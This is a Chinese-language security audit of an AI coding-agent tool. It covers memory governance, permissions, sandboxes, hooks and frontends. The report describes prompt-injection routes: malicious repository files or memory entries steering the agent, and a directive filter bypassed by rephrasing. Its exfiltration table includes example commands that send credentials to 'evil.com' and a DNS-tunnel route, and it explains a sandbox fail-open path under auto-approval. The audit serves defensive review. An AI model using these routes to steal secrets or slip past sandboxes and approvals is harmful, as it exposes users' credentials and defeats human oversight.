- `crates/minicoding-tools/src/memory/` **只有 `write.rs` 一个工具**（只有 `memory.write`）。
- `AutoMemory::clear()`（`auto.rs:261`）**无生产调用点**。
- CLI `commands/` 只有 backup/cred/doctor/exec/mcp/serve/session，**无 memory 子命令**。
- 用户查看或删除单条 auto 记忆只能手动编辑 `~/.minicoding/memory/auto*.{md,json}`。
- 而 `policy/builtin.rs:264-277` 对 `target: "auto"` **默认 `Allow`**。

**组合后果**：模型可以**隐式写入**长期记忆，用户**无法查看、无法纠正、无法删除**（除非手改 JSON）。叠加 §7.3 的注入问题——恶意仓库可以让模型把一条注入指令写进长期记忆，此后**跨项目、跨会话持久生效**，而用户没有任何治理界面。

这是我在这轮审查中认为**最需要补齐的用户能力缺口**，且实现成本很低（加一个 `memory` 子命令 + `memory.read`/`memory.delete` 工具）。

**【P2】C-27 指令性检测是关键词启发式，易绕过**（`core/util/mod.rs:62`）

`contains_directive` 匹配 EN/ZH 祈使词与 `## Rules` 类标题，且**只检查 `content` 字段、不检查 `topic`**。改写成陈述句（"团队惯例是先跑 fmt"）即可免检通过并持久注入每轮 system。

**【P2】分层无"就近覆盖"**（`loader.rs:289-317`）

global → root → leaf 是**拼接**，深层文件**不能覆盖**浅层规则，只能追加。克隆仓库根目录的恶意 AGENTS.md **位置永远在前**（优先级更高）。安全上"就近覆盖"通常更安全（用户本地 .minicoding 应能覆盖仓库内），当前顺序相反。

**【P2】`auto.index.json` 损坏不自愈**（`auto.rs:166-167`）：`serde_json::from_slice` 失败直接 `MemoryError::Serialize` 上抛，无回退/重建。而 `jsonl.rs` 的 session index 已按 R9 STR-2 改为 **warn + 扫描重建**。两处处理不对称，应统一为后者的韧性策略。

**【P2】AGENTS.md 全会话冻结**（`sdk/builder.rs:307`）：启动时一次性 `load_project_doc_sync` 塞进 `PromptContext` template。会话内文件变更、`/resume` 换目录都**不刷新**。用户修改了 AGENTS.md 必须重启会话。

**【P3】无任何保留策略 / PII 治理**：无 TTL、无按年龄/体积清理、无 `session prune`。仅 `session delete <id>`（`session_cmd.rs:52,101`）。转录含完整 shell stdout（如 `cat ~/.aws/credentials` 的输出），无脱敏通道、无清理机制。

### 7.4 存储与 Journal

**值得肯定**：
- JSONL 持久化质量高（`storage/jsonl.rs`）：单次 `write_all` + `sync_all` 在 fs2 排他锁内；格式头 + `format_version` 校验（防静默丢事件）；坏行跳过；4 MiB 单行上限（STR-3）；锁获取 10s 超时轮询（STR-6）；SeqGap 改 warn+继续（STR-1）；index 损坏扫描重建（STR-2）。
- 凭证治理到位：OS keyring + 0600 文件兜底（`cli/cred.rs`），config.toml 只存 `env:` 引用，LKG 快照落盘前 `scrubbed_for_lkg` 剥离明文（`core/config.rs:409-421`）。**API key 不会进入转录** ✓

**【R10-23 / P2】目录权限 0755**：所有**文件** 0600（`jsonl.rs:693`、`audit.rs:68`、`long_term.rs:63`、`auto.rs:331`），但**目录**全靠 `create_dir_all` 默认权限 → `~/.minicoding/`、`sessions/`、`memory/` 为 **0755**，会话文件名可枚举。同机其他用户可列出你的会话列表（虽读不到内容）。`paths.rs` 无任何权限助手。

**建议**：加一个 `ensure_private_dir()` 助手，创建时 `chmod 0700`（Unix）/ 设置 ACL（Windows）。

---

## 8. 安全（一）：权限模型（`minicoding-policy`，4,601 行 / 10 文件）

### 8.1 值得肯定的部分

1. **C-21「L0 硬约束不可被 Hook 覆盖」在代码层真实成立**（不只是文档）。双重强制：
   - `hooks/dispatch.rs:74`：Hook 返回 Allow 时，若 `builtin_deny` 命中则**丢弃该 Allow**；
   - `hooks/permission.rs:106-111`：Hook **改写输入后重新查询**并取更严格者，合并 verdict 覆盖 PreToolUse 直出的 Allow。
2. **决策与交互分离**（`PermissionPolicy` vs `PermissionPrompter`）设计干净，支持 non-TTY 场景替换。
3. **SEC-3 折叠兜底**（`permission.rs:627-677`）：prompt 未提供 `AllowAlways`/`DenyAlways` 选项时，前端回传的 Always 一律**折叠为一次性**——约束在 core 强制而非依赖前端自觉。这是正确的信任边界。
4. **denial 检测用结构化 errno 而非 stderr 文本**（`runtime/denial.rs:25-37`），LLM 不可伪造；Windows `ERROR_ACCESS_DENIED = 5` 平台化处理正确（denial.rs:40-58）。
5. **`path_sandbox.rs`** 的 `resolve_under` / `is_under`：canonicalize + 最长存在祖先回退 + 词法 `..` 归一化 + 组件边界前缀匹配 + 显式拒绝 `~`。POSIX 侧相当扎实，**TOCTOU 与 Windows 无兜底在文档里如实披露**（path_sandbox.rs:44-52）——诚实。

### 8.2 缺陷

**【R10-06 / P1】`full-access` 的"红色警告 + 二次确认"是死代码**

`policy/mode.rs:106` `requires_confirmation()` 与 `:113` `warning_text()` **全仓零调用点**（`grep -rn requires_confirmation crates/` 仅命中 mode.rs 自身与测试）。

即 `--preset full-access` 直接展开为 `ApprovalMode::Never` + `DangerFullAccess`，**无警告、无二次确认、无沙箱**。而 README:26 明确承诺"`danger-full-access`（**显式确认**）"。

**建议**：在 CLI/TUI/server 三端的 preset 应用路径上统一调用 `requires_confirmation()`，命中时打印 `warning_text()` 并要求输入确认（如键入 `yes` 或 `--i-understand` 标志）。这类"最危险开关"的确认是最不该被漏掉的。

**【R10-09 / P1】权限持久化无 workdir 作用域、无过期**

`core/policy/persist.rs`：键为 `tool` 或 `tool@<相对路径前缀>`，全部落在**全局** `~/.minicoding/policy.toml`。

**跨项目误放行**：在项目 A 对 `fs.write@src` 点"始终允许"，切到项目 B（同样有 `src/`）会**直接命中自动放行**（`decision_for_path`，persist.rs:82-118）。无 workdir 绑定、无时间戳、无 TTL、无撤销 UI。（文件权限 0600 ✓、pid+序号临时文件原子写 ✓，这两点做得对。）

**建议**：决策键加入 workdir 的哈希或绝对路径（并对"家目录内项目"做规范化）；增加 `created_at` 与 TTL（如 30 天）；提供 `minicoding policy list|revoke` 命令。

**【P2】`check_file_read`（C-03 只读路径约束）在生产不可达**

`builtin.rs:864-878` 仅在 `SideEffect::None` 分支调用，而 `SideEffect::None` 的工具**从不进** `execute_side_effect_call`。实际约束靠工具层 `tools/src/util.rs:20 resolve_path`。

所以不是直接越权（工具层有防护），但**策略层 C-03 对读路径是空转**，且不落审计、不产生 `PathEscaped` 的 denial 计数——纵深防御少了一层，且**审计盲区**。

**【P2】`plan.exit` 同样在只读桶 → Hook 无法拦截退出 Plan 模式**（`plan/exit.rs:132-134`）

`SideEffect::None`。它修改**全局 Plan 状态**，却走只读桶：PreToolUse Hook 看不到、policy 看不到。文档称"Hook 不可覆盖 L0"成立，但反向看——**Hook 也完全无法参与 plan.exit 的把关**。任何"退出 Plan 前必须过审计"的 Hook 策略不可实现。

（注：`plan.exit` 的 `None` 是刻意的，否则它在 Plan 模式下会被自己的硬门挡住——见 `builtin.rs:1207` 的测试。这是设计两难，但当前的解法（免检）代价是审计盲区。更好的解法是给 Plan 硬门加显式白名单而非依赖 `SideEffect`。）

**【R10-24 / P2】`AutoApprovePrompter` 对任何 prompt 恒返回 Allow**（`policy/prompter.rs:59-63`），被 `minicoding exec` 使用（`cli/commands/exec.rs:143`）。与 R10-03 联动后后果严重（见 §9.2）。

**【P2】`policy/src/ssrf.rs` 是 352 行自认死代码**（`ssrf.rs:3-11` 原文）："本模块为死代码——生产路径使用 `minicoding-tools/src/web/ssrf.rs`…本模块以公共 API 导出但全仓零调用点，且判定更弱（同步阻塞 DNS、无 rebinding 防护）"。

安全关键逻辑双份、**弱的在 policy 且对外 `pub` 导出**，是明确的维护陷阱。R9 已标注（NET-1）但未处置。**建议直接删除**（若担心破坏下游，先 `#[deprecated]` 一个版本）。

---

## 9. 安全（二）：三平台 OS 级沙箱（`minicoding-sandbox`，2,753 行 / 11 文件）

这是 README 的核心卖点之一，也是本次审查发现问题最集中的模块。

### 9.1 三平台实测结论

| 平台 | 机制 | 真实强度 | 判定 |
|------|------|---------|------|
| **macOS** | Seatbelt `sandbox_init` | deny-by-default；`(deny network*)` 全覆盖、`(deny file-write*)` 打底、$HOME 默认拒读 + 工具链白名单 + 凭证目录尾部 deny（macos.rs:232-300） | ✅ **真隔离，且最完整** |
| **Linux** | landlock（LSM）+ seccomp（可选） | 文件系统隔离真实；**网络面在内核 <6.7 为零**；UDP/DNS/ICMP 永不受限；`/dev`、`/proc` 在 `SYSTEM_RO_PATHS`（linux.rs:46-48）→ 子进程可读块设备/其他进程 proc 条目；`/tmp` + `$TMPDIR` 被授予**写权限**（linux.rs:333） | ⚠️ **真隔离但有显著缺口** |
| **Windows** | Job Object | 仅 `KILL_ON_JOB_CLOSE` + `DIE_ON_UNHANDLED_EXCEPTION` + `ActiveProcessLimit=64` + 6 项 UI 限制（windows.rs:222-263）。**无受限令牌 / DACL / IL / AppContainer**；`id()` 叫 `"windows-token"`（windows.rs:174）但代码里只有 `CreateJobObjectW`，**无 `CreateRestrictedToken`** | ❌ **非安全边界** |

### 9.2 【R10-03 / P0】fail-open 与 exec 模式的叠加

**问题 A：landlock 不可用即裸奔**（`sandbox/src/driver.rs:53-62`）

探测失败 → `NoopDriver` + `tracing::warn`，**执行照常**。无 fail-closed 开关、无启动期硬阻断。

影响场景：WSL1、旧内核、受限 LSM 的容器、某些 CI 环境。用户**不会**收到显眼警告（只是一条 tracing warn），却以为自己在沙箱里。

**问题 B：沙箱失败 → 弹窗询问"是否在沙箱外运行"，而 exec 模式自动批准**（`runtime/denial.rs:81`）

`maybe_sandbox_fallback` 识别 `sandbox apply/post_spawn failed` 后弹窗询问，批准则把策略换成 `DangerFullAccess` 重跑。而 `AutoApprovePrompter`（`policy/prompter.rs:59-63`）对**任何** prompt 一律 `Decision::Allow`，它被 `minicoding exec` 使用（`cli/commands/exec.rs:143`）。

**叠加后果**：
```
minicoding exec --sandbox external-sandbox "跑测试"
   ↓ 沙箱初始化失败（或 Windows 上 toolhelp 快照竞态，windows.rs 自认的已知问题）
   ↓ maybe_sandbox_fallback 弹窗
   ↓ AutoApprovePrompter 恒 Allow
   ↓ 策略切换为 DangerFullAccess，重跑
   → 完全无隔离执行
```

**这直接击穿了 README:26 承诺的"`external-sandbox`（CI/容器内批量执行，**默认沙箱拒绝熔断**）"——默认是"自动放行"而非"熔断"。**

**建议**：
1. 增加 `--sandbox-required` / 配置项 `sandbox.fail_closed = true`，沙箱不可用时**中止**而非降级。CI 场景应默认 fail-closed。
2. `minicoding exec` 的 fallback 决策**不应**走 `AutoApprovePrompter`。至少对 `maybe_sandbox_fallback` 这类"安全降级"弹窗，应强制人工确认或预先通过 `--allow-unsandboxed` 显式授权。
3. Windows 的 toolhelp 竞态必须修复，否则这条路径会被稳定触发。

### 9.3 【R10-17 / P1】seccomp 从未随发布产物交付

- `Cargo.toml:18-22`：feature `seccomp` **默认关**。
- 【主审核实】`grep -rn seccomp .github/ dist-workspace.toml` → 只在 `ci.yml` 的 `--all-features` 编译检查与 desktop job 的 `apt-get install libseccomp-dev` 中出现；**`release.yml` 中零引用**。
- release 由 cargo-dist 以**默认 feature** 构建。

**后果**：发布二进制中的 `ptrace`/`io_uring_*`/`unshare`/`setns`/`socket(AF_INET)` 封堵**全部不存在**。

代码本身质量尚可（deny-list 非 allow-list，`seccomp.rs:53-77`），但 **deny-list 的 seccomp 本就是弱防护**，且从未交付。libseccomp 0.4 与 edition 2024/nightly 的兼容性也未经 release 验证。

**建议**：要么在 release 中启用并**改为 allow-list**（真正有意义的 seccomp 应是 allow-list），要么从 README 的卖点列表中移除 seccomp 并标注"实验性"。当前"宣称有、实际没有"是最差状态。

### 9.4 【R10-13 / P1】沙箱覆盖面严重不全

**只有** `shell.run`（`shell/run.rs:156-185`）与 `shell.background`（`background.rs:171-198`）应用沙箱。

**未覆盖**：
| 执行体 | 位置 | 风险 |
|--------|------|------|
| `git` 子进程 | `git/diff.rs:115,191-251`；`git/apply.rs:139,221-332` | `git` 可执行 hooks、`core.pager`、`.gitattributes` 过滤器 |
| MCP stdio 子进程 | `mcp/client/rmcp.rs:160` | 第三方 MCP server 完全无隔离（security.md:1012 已承认） |
| Hook 脚本子进程 | `hooks/script.rs:196-200` | 沙箱是**可选注入** `ScriptHook::with_sandbox`（script.rs:86），**默认不注入** |

**Hook 默认不在沙箱里，这一条尤其值得注意**：Hook 是用户/组织配置的可执行脚本，是本项目最高权限的扩展点，却完全绕过沙箱。虽然 Hook 配置只在全局（不是项目级，避免了 clone 即执行），但一个"能在你机器上跑任意命令的 Hook"配上"不受沙箱约束"，意味着 **Hook 是绕过整个沙箱模型的官方通道**。

**建议**：Hook 脚本默认注入沙箱（可显式 opt-out），并在文档中说明 Hook 的信任级别。

### 9.5 其他

**【P2】Linux 网络限制实质缺位**：
- 仅 `AccessNet::{BindTcp, ConnectTcp}`，需 ABI ≥ 4 / Linux 6.7+（`linux.rs:145`）。6.6 及以下（**含 WSL2 默认内核、Ubuntu 22.04**）`linux.rs:260` **仅 warn 后跳过** → 子进程 TCP 完全放开。
- UDP / DNS / ICMP **永不受限**（`linux.rs:279-285` 如实记录——诚实，但意味着"网络隔离"在 Linux 上不成立）。

**数据外泄路径**：即使 TCP 被封堵，子进程仍可通过 **DNS 隧道**（UDP 53 不受限）外传数据。这让"沙箱防止 exfiltration"的宣称在 Linux 上打折。

**【P2】Seatbelt 转义漏反斜杠**（`macos.rs:103-114`）：拒绝 `(`/`)`（fail-closed ✓）、转义 `"`，但**不转义 `\`**。路径 `...\` + `"` 组合会生成 `\\"` → 反斜杠自转义后引号提前闭合，可注入 Scheme 表达式。需攻击者能控制 workdir/HOME 路径，门槛较高但应修。

**【P3】`is_hardened()` 的诚实**：Windows 返回 `false`（windows.rs:167），`security.md:817` 自认"仅进程级遏制"。**实现层是诚实的，问题出在 README 与 innovation.md 的对外宣称**。

---

## 10. 安全（三）：Hooks 系统（`minicoding-hooks`，3,805 行 / 8 文件）

### 10.1 值得肯定的部分 —— 这一模块整体质量高

1. **Hook 不是"克隆即执行"**。`[hooks]` 配置**只在全局** `~/.minicoding/config.toml`（`config.rs:215-320`、`paths.rs:41-42`），**不存在项目级 Hook**。项目级 `.minicoding/mcp.json` 有 C-24 **首次批准门 + 命令指纹**（`mcp/approval.rs:46/249/430`）。
   > 这是同类工具里少见的正确处理。Claude Code 的 settings.json 支持项目级 hooks，是从 clone 到执行的已知风险面；本项目主动规避了。
2. **Hook 执行安全完备**（`hooks/src/script.rs`）：`env_clear()` + 5 变量白名单（script.rs:22/217）、per-hook 与全局双重超时取**短者**、`process_group(0)` + `killpg(SIGKILL)` 杀整组（script.rs:135-155/279）、stdout/stderr 各 1 MiB 截断、退出码 2 = deny 语义。
3. **C-21 L0 不可覆盖在代码层双重强制**（已在 §8.1 详述）。
4. **内容来源标注**（`registry.rs:126`）：Hook 注入的内容（如 PostToolUse on `web.fetch` 结果）无来源标注时**提示模型**，降低注入风险。这个细节考虑周到。

### 10.2 缺陷

**【R10-13 / P1】Hook 脚本默认不在沙箱内**（已在 §9.4 详述）

`ScriptHook::with_sandbox`（script.rs:86）是**可选注入**，默认不注入。Hook 是最高权限扩展点，却绕过整个沙箱模型。

**【P3】`hooks/registry.rs` 1,175 行的 10 个事件未逐条核对** `builtin_deny` 透传是否一致。从 `dispatch.rs:74` 与 `permission.rs:106-111` 两处强制点看，C-21 的实现是完整的；但子审查未逐事件验证，列为存疑项。

**【P3】`ui.ask` 为 `SideEffect::None`**（`ui.rs:81`）→ 只读桶直发，不可被 Hook/策略限流；高频弹窗可能成为 DoS/诱导面。

**【存疑】`.minicoding/agents/*.md`**：`model/subagent.rs:32`、`spawn.rs:73` 引用了它，但子审查**未找到加载器**——`SubagentType::Custom` 疑似"文档先行、实现缺失"。若后续补上，需配套 C-24 式批准门，否则是仓库内不可信指令直入 system prompt 的通道。

---

## 11. 安全（四）：提示注入与数据外泄

### 11.1 不可信输入面

| 来源 | 是否定界 | 是否转义边界 | 备注 |
|------|---------|------------|------|
| 工具输出（`web.fetch`/`shell`） | ✅ `<tool_output>` | ✅ 零宽空格转义（S21，`common/mod.rs:63-72`） | **做得好** |
| **AGENTS.md / 项目文档** | ✅ `<project_doc>` | ❌ **未转义**（`inject.rs:61`） | **R10-07，P1** |
| **AutoMemory / 长期记忆** | ✅ `<memory>` | ❌ **未转义**（`inject.rs:35-82`） | **R10-07，P1** |
| git diff / MCP 输出 | ✅ | ❌ 未转义 | 待统一 |
| 工具错误消息 | — | — | 未审计 |

### 11.2 数据外泄路径评估

假设模型被成功注入，攻击者想外传 `~/.aws/credentials`：

| 路径 | 防线 | 有效性 |
|------|------|--------|
| `fs.read ~/.aws/credentials` → `web.fetch evil.com?d=...` | `fs.read` 有 `is_sensitive_path` 脱敏 | ✅ 有效 |
| `fs.grep ".*" .env` → 外传 | **fs.grep 不脱敏**（R10-12） | ❌ **可绕过** |
| `git diff` 含密钥 → 外传 | **git.diff 不脱敏** | ❌ **可绕过** |
| `shell.run "cat ~/.aws/credentials"` | `shell.run` 输出**有**脱敏 ✅；但需用户批准 | ✅ 有效（若批准环节没被绕过） |
| `shell.run "curl -d @.env evil.com"` | 需用户批准 + `web` 侧 SSRF 检查 | ✅ 有效（依赖批准） |
| 子进程 DNS 隧道 | Linux 沙箱 UDP 不受限 | ❌ **Linux 上无效** |
| `env python3 payload.py` 免审执行 | **R10-01 白名单绕过** | ❌ **可绕过** |

**结论**：外泄防线在"工具输出脱敏"这一层存在**明确的、可演示的绕过**（`fs.grep`/`git.diff` 不脱敏），在 Linux 上对具备命令执行能力的攻击者**基本失效**（DNS 隧道）。

**建议优先级**：
1. 把脱敏下沉到统一输出层（§5.4）——成本最低、收益最大。
2. 修复 `is_harmless_command`（R10-01）——堵住免审执行。
3. Linux 侧补充 DNS/UDP 限制（可考虑在沙箱内 `/etc/resolv.conf` 覆盖为不可达，或配合 seccomp 禁 `socket(AF_INET, SOCK_DGRAM)`）。

---

## 12. 四形态前端与共享 Runtime 一致性

### 12.1 【R10-04 / P0】Web 形态开箱即 401 —— 主审独立复核

**事实链**：

1. `cli/src/commands/serve.rs:122` `no_auth` 默认 `false`，`auth_token` **无默认值** → 自动生成 token 并 `println!("SERVER_TOKEN={t}")`（serve.rs:339）。
2. 前端 token 唯一来源：
   - 【主审核实】`crates/minicoding-web/src/api/client.ts:50`
     ```ts
     let authToken: string = import.meta.env.VITE_API_TOKEN ?? "";
     ```
     这是**构建期**内联的环境变量。
   - `setApiToken()` 全仓**仅一处调用**：`stores/desktop.ts:148`，**在 Tauri 分支内**。Web 分支（`desktop.ts:124-130`）只 `setApiBase("")`，**不设 token**。
3. 【主审核实】全仓 grep 无任何 token 输入框；`SetupDialog.tsx` 只有 apiBase/model；无 `.env*` 文件；`vite.config.ts` 的 proxy 只转发，**不注入 Authorization**。
4. 【主审核实】`server/src/http.rs:446` 返回裸 `StatusCode::UNAUTHORIZED.into_response()`，**body 为空**。

**用户体验后果**：
```
$ minicoding serve --port 8080 --web ./dist
SERVER_TOKEN=a1b2c3...        ← 打印到终端
（浏览器打开 http://localhost:8080）
→ 所有 API 返回 401
→ 界面显示 "HTTP 401: "      ← 冒号后空白，因为响应体是空的
```

用户看到的错误信息是一个**空的 401**，没有任何"请先配置 token"的引导。唯一的绕过是 `--no-auth`（启动时会打印"本机任意进程可读取会话、代答权限、执行命令"的警告）或**重建前端**带上 `VITE_API_TOKEN`。

**Desktop 不受影响**（sidecar 经 env 传 token，`setApiToken` 在 Tauri 分支内被调用）。这解释了为什么这个问题在开发中没被发现——**开发者大概率是用 Desktop 或 dev 模式验证的**。

**修复建议（按性价比排序）**：
1. **最小修复**：401 响应体给出可操作信息（`{"error":"unauthorized","hint":"..."}`），前端识别 401 并弹出 token 输入框，存 localStorage。约 30 行代码。
2. **根治**：server 首次启动时把 token 写入 `~/.minicoding/server.token`（0600），dev/本地模式下前端通过 `/api/session-token`（需 loopback origin）获取；或提供一个 `--print-token` + 一次性登录链接（token 在 URL fragment 中，前端读取后清除）。
3. 保留 `--no-auth` 但仅允许 loopback（现有逻辑已硬拒 `--no-auth` + 非 loopback，✓ 正确）。

### 12.2 值得肯定的部分

1. **Desktop 是真应用，不是骨架**：373 行 `sidecar.rs`（`--bind 127.0.0.1:0` 动态端口、`MINICODING_LISTENING_PORT=` 机读行优先解析、kill_on_drop、Windows `CREATE_NO_WINDOW`）+ 98 行 `tray.rs` + `tauri.conf.json` + capabilities + `gen/schemas` + 独立 `desktop-release.yml`（三平台 `cargo tauri build --features desktop`）。`binaries/` 下的占位脚本是 152 字节 shell 且已被 `.gitignore:35` 排除，不是误提交二进制。
2. **SSE 协议实现质量高**（`server/src/sse.rs`）：seq **单一写者**（sequencer task，杜绝多连接重复分配 seq）；`sse_live` 与 `sse_stream` 分离避免首次连接重放已决权限弹窗；`RehydrateRequired` 不可恢复时显式通知前端重拉 snapshot（FE-3：`id:` 填真实 seq 防重连风暴）；`format_sse_event` 把 seq 同时写进 `data:` 载荷对齐 `EventDto` 契约（FE-8）；畸形 `Last-Event-ID` 不再回退 0（FE-14）。前端 `client.ts:346-360` 对应识别 Rehydrate。带单测。
3. **鉴权本体设计扎实**：`http.rs:455` **常量时间比较**防时序侧信道；`/health` 以外全部强制鉴权（含 `/metrics`）；`--no-auth` + 非 loopback 在 CLI 与 server **两处**都硬拒启动（`serve.rs:299-305`、`main.rs:93-102`）；token 经 **env 而非 argv** 传 sidecar（C-04，防 `/proc/pid/cmdline` 泄露）；env 下传时 stdout 打印**掩码**而非明文（FE-5）。
4. **取消路径四前端齐全且实现正确**：CLI 双路径（raw 模式 0x03 字节 / cooked 模式 SIGINT，`interactive.rs:389-401`）；TUI 的 R9 P3-3 修复（不再 build 时克隆 token，改发 `UiCommand::CancelTurn` 由桥接层**实时**取 `rt.cancel_token()`，`runtime_bridge.rs:264-267`）；server `POST /sessions/{id}/cancel`。
5. **Web TS 质量干净**：`tsconfig.json` 全 strict + `noUnusedLocals/Parameters`；非 generated 代码中 `any` **零命中**、`dangerouslySetInnerHTML`/`innerHTML`/`eval` **零命中**；CI 有 `pnpm gen-types && git diff --exit-code src/api/generated` 的 DTO 陈旧门禁（ci.yml:270-271）。
6. **斜杠命令单一事实来源**：`core/src/util/slash.rs:61` 纯函数、带单测，CLI/TUI 共用。

### 12.3 其他前端缺陷

**【P1】发布产物的能力静默降级**（与 R10-15/17 同源）

`cli` 的 default features = `["memory","sandbox","serve","mcp","file-undo"]`，**不含** `web`/`hooks`/`extensions`/`lsp`。cargo-dist 以默认 features 构建 → **cargo-dist 产出的 `minicoding` 二进制没有 `web.fetch`/`web.search`、没有 hooks、没有扩展、没有 LSP**。

而 README 的"核心特性"列表第一项就包含"Web 抓取"。`dist-workspace.toml` 只声明 5 个 target，**未声明 features**。这是配置层的静默降级，使用者从二进制无从得知。

**建议**：`dist-workspace.toml` 或 release workflow 中显式指定 features（如 `--features full`），并在 `minicoding --version`/`doctor` 输出中打印**已编译的能力集**（类似 `docker version` 打印 plugins）。能力可发现性对这类工具很重要。

**【P2】TUI 无 keyring，且错误指引指向不存在的 `--api-key`**（`sdk/builder.rs:171`）

错误串固定为："API key 未配置：请设置 OPENAI_API_KEY 环境变量、使用 `--api-key` 参数，或通过 `minicoding cred store` 写入 keyring"。
但：
- TUI 关闭了 `cred-keyring` → `sdk/src/cred.rs:88-92` 的桩 `try_keyring_get() -> Ok(None)`，keyring **静默不可用**；
- TUI `main.rs` **无 clap**，`--api-key` 参数**根本不存在**（5 个 provider 参数全传 `None`）。

**用户死循环**：按指引跑 `minicoding cred store`（CLI 写入 keyring 成功）→ 启动 `minicoding-tui` → 报同一句 → 第三条路已做过、第二条路不存在。**这是可复现的误导性错误体验。**

**【P2】配置解析失败静默降级，零提示**（`core/config.rs:395`）

config.toml 与 last-known-good 双双失败时返回 `Err`，但两个调用点都是 `load_config().unwrap_or_default()`：
- `sdk/src/builder.rs:132`
- `server/src/main.rs:107`

→ 用户配置里一个 TOML 语法错，程序**静默回退**到 `openai / gpt-4o-mini`（config.rs:69-82），随后报"API key 未配置"，用户无从知道自己配置没被读。**LKG 机制（`config.rs:388-392`）在这一路径上被完全绕过。**

**建议**：配置解析失败应 `eprintln!` 明确警告（"配置文件解析失败，已回退默认值：<path>:<line>: <reason>"），或至少在 `doctor` 中暴露。

**【P2】配置优先级在 TUI 缺一层**。README 宣称"CLI 参数 > 环境变量 > config.toml > provider 默认值"，在 CLI（`builder.rs:132-164`）与 server（`main.rs:107-127`，clap `env=` 属性）成立；但 **TUI 完全没有 CLI 参数层**（`main.rs` 无 clap），且 `grep env::var crates/minicoding-tui/src` 为**空**——TUI 只能靠 config.toml 或 sdk builder 读的 4 个 `OPENAI_*` 变量。切换 provider 必须改文件。

**【P2】`is_local_origin` 只校验 host 不校验 scheme/port**（`http.rs:330-337`）：任意 localhost 端口上的页面（含被攻陷的本地 dev server）都在 CORS 白名单内，且 `allow_methods(Any)` + `allow_headers(Any)`。攻击者需先知道 token 才能利用，因此不是直接 CSRF；但应补充 `Vary: Origin` 并收紧 methods/headers。

**【P2】Web 无 React ErrorBoundary**（`main.tsx` 直接 `createRoot().render`）：任意渲染异常即白屏。

**【P3】Web 无 slash 命令**：`core/src/util/slash.rs` 的 `parse()` 只有 CLI（`interactive.rs:141`）与 TUI（`app.rs:687`）两个消费者。Web 输入 `/help` 会被当作普通消息发给 LLM。前端切换时行为不一致。

**【P3】`minicoding-protocol` 名不副实**：唯一消费者是 server（8 个引用全在 `server/src/{lsp,ndjson,acp,sse,turn_tail,workspace,session_mgr}.rs`）。`modules.md:791` 称"CLI / TUI / HTTP Server / ACP / LSP 适配器共用此 crate"——ACP/LSP 本身就在 server 里，且 cli/tui 都不依赖它。实为 **server 私有 DTO crate**。

**【P3】`minicoding_sdk::Client` 零消费者**：`lib.rs` 731 行公开嵌入 API，全仓无外部使用；无 `examples/`；cli/tui 只共用 `builder::build_runtime`。是"建成未通车"的公开 API，**且已发布到 crates.io**。

---

## 13. 用户体验（UX）

### 13.1 值得肯定

- **取消体验四前端齐全**（§12.2），且 TUI 的 R9 P3-3 修复（实时取 `cancel_token`）是真正的体验改进。
- **TUI 对不可达能力诚实降级**（`app.rs:745-753`），运行中提交不再静默忽略而是提示"正在运行…Ctrl-C 中断后可发送"（`app.rs:682`）。
- **`doctor` 命令存在**（`cli/commands/doctor.rs`），方向正确。
- **CHANGELOG 是手写策展而非 git-cliff 流水账**：48KB / 13 个版本段，每段有主题导语与 `### Security / Reliability` 等自定义分组——对使用者是有效信号。

### 13.2 缺陷

**【P1】TUI panic 会永久破坏用户终端**（`tui/src/main.rs:49-51`）

```rust
let mut terminal = ratatui::init();
let result = run_loop(&mut terminal, &workdir, &SessionLoadMode::None);
ratatui::restore();     // ← panic 时不执行
result
```

全仓 `std::panic::set_hook` **仅 1 处**（`desktop/src/main.rs:76`）；`catch_unwind` **全仓 0 处**；`cli/src/main.rs` 无任何 panic 处理。

→ TUI 内 panic = 终端停在 **raw mode + alternate screen**，用户 shell 不可用（需 `reset` 盲打恢复）；会话内未落盘状态丢失。

**建议**：TUI 入口用 `catch_unwind` 包裹 `run_loop`，在 unwind 后强制 `ratatui::restore()`；同时注册 panic hook 打印友好提示（"发生内部错误，已保存会话 <id>，可用 `minicoding --resume <id>` 恢复"）。这是 TUI 应用的必备防御，成本很低。

**【P1】配置错误静默降级**（§12.3）与**错误指引指向不存在的功能**（`--api-key` in TUI）——两者都会造成"用户照着做却越做越错"的体验。

**【P2】首次运行体验**：未见交互式 onboarding（`SetupDialog.tsx` 只有 apiBase/model，无 token）。新用户需要：安装 → 配置 provider → 配置 API key → 才能第一次提问。README 的快速开始直接是 `minicoding "解释 src/main.rs 的入口逻辑"`，**跳过了 API key 配置步骤**，首次运行会直接报错。

**【P2】401 空 body**（§12.1）是最典型的"不 actionable 的错误消息"。

**【P2】`task.spawn` 在 Web 侧是僵尸工具**（§3.3）：schema 暴露给 LLM，调用必失败 → 模型重试、白烧 token、用户困惑。

**【P3】`permission_timeout_sec` 默认 300s，Web 弹窗未出现时 65s 超时**（`client.ts:302` 注释）：两者不匹配时的默认判定行为未追到底，列为存疑。

---

## 14. 工程化质量

### 14.1 测试

**重要更正（避免误判）**：原始度量显示 `unwrap() + expect()` 合计 **2,209 处**、`unsafe` **104 处**——这两个数字看似危险，实际是**误读**。精确分层统计如下：

| 指标 | 原始计数 | 精确分层 |
|------|---------|---------|
| `unwrap()` + `expect()` | 2,209 | **1,948 处在测试代码（87.8%）**；179 处在 `tests/` 目录或 `main.rs`；**非测试非入口的库代码仅 39 处**，其中 18 处还在 `core/src/testing/*`（test-util harness）。**真正的生产 panic 点约 21 处 / 90k 行**，形态统一为 `Mutex::lock().expect("... poisoned")`，并带 `# Panics` 文档段（如 `providers/common/credential.rs:72-73`） |
| `unsafe` | 104 | **85 处配了 SAFETY 注释**；约 65 处是 edition 2024 把 `std::env::set_var` 标为 unsafe 所致的**测试代码**（均持 `ENV_LOCK` 并注明理由）。真正的 FFI unsafe 约 **36 处**，集中在 `sandbox/windows.rs`(21)、`hardening.rs`(9)、`seccomp.rs`(2)、`macos.rs`(2)、`linux.rs`(1)、`hooks/script.rs:147`（`killpg`，含 SAFETY） |

> **这是教科书级的纪律，应在报告中如实肯定。** 用原始计数评判这个项目是严重不公。

**测试质量**：对 1,606 个测试自动分类 —— 28.8% 是 ≥3 断言的行为测试，24.4% 双断言，**仅 2.9%（46 个）是纯序列化 round-trip**，1.6% 无断言。0 处 `assert_eq!(x, x)`、0 处 `assert!(true)`、0 处 `#[ignore]`。**测试质量好于"数量虚高"的预期。**

